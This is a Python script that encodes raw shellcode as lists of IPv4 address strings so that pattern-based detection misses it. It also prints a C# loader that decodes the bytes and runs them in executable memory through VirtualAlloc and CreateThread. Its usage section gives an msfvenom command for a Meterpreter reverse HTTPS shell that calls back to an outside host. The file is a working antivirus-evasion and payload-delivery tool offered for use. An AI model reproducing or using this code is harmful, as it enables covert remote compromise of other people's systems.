#!/usr/bin/env python3
"""
IPv4 Shellcode Encoder
======================
Encodes shellcode bytes as IPv4 address strings.
Useful for evading pattern-based detection that scans for shellcode
byte sequences — the encoded form looks like a list of IP addresses.

HOW IT WORKS:
  1. Read raw shellcode bytes from a .bin file
  2. Pad to multiple of 4 with NOP (0x90) bytes
  3. Group bytes into chunks of 4
  4. Convert each chunk to an IPv4 string (b0.b1.b2.b3)
  5. Output a C# string array ready to paste into a loader

USAGE:
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=11.11.11.11 LPORT=443 -f raw -o shell.bin
  python3 ipv4-encoder.py shell.bin

  The output goes into a C# loader that decodes at runtime:
    - Split each IP on '.'
    - Parse each octet as a byte
    - Reassemble the byte array
    - Execute the shellcode

C# DECODER TEMPLATE (paste after this script's output):
  See the template printed at the bottom of this script's output.
"""

import sys
import os

def encode_ipv4(shellcode_path):
    with open(shellcode_path, "rb") as f:
        shellcode = f.read()

    # Pad to multiple of 4 with NOPs
    padding = (4 - (len(shellcode) % 4)) % 4
    if padding > 0:
        shellcode += b"\x90" * padding
        print(f"# Padded with {padding} NOP byte(s) to align to 4 bytes")

    # Convert to IPv4 strings
    ipv4_list = []
    for i in range(0, len(shellcode), 4):
        chunk = shellcode[i:i+4]
        ipv4_list.append(f"{chunk[0]}.{chunk[1]}.{chunk[2]}.{chunk[3]}")

    print(f"# Shellcode: {len(shellcode)} bytes → {len(ipv4_list)} IPv4 addresses")
    print()
    print("// C# — paste into your loader's Decode() call:")
    print('string[] s = {')
    for ip in ipv4_list:
        print(f'    "{ip}",')
    print('};')

    # Print the C# decoder
    print()
    print("// C# Decoder — paste alongside the string array above:")
    print(CSHARP_DECODER)

CSHARP_DECODER = r"""
using System;
using System.Net;
using System.Runtime.InteropServices;

// Decode IPv4 strings back to shellcode bytes
static byte[] DecodeIPv4(string[] addresses) {
    byte[] buf = new byte[addresses.Length * 4];
    int idx = 0;
    foreach (string addr in addresses) {
        byte[] ipBytes = IPAddress.Parse(addr).GetAddressBytes();
        foreach (byte b in ipBytes)
            buf[idx++] = b;
    }
    return buf;
}

// Minimal runner example (place inside a class with appropriate P/Invoke imports):
// byte[] shellcode = DecodeIPv4(s);
// IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
// Marshal.Copy(shellcode, 0, mem, shellcode.Length);
// IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
// WaitForSingleObject(hThread, 0xFFFFFFFF);
"""

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} shell.bin")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    if not os.path.exists(shellcode_path):
        print(f"Error: file '{shellcode_path}' not found")
        sys.exit(1)

    encode_ipv4(shellcode_path)
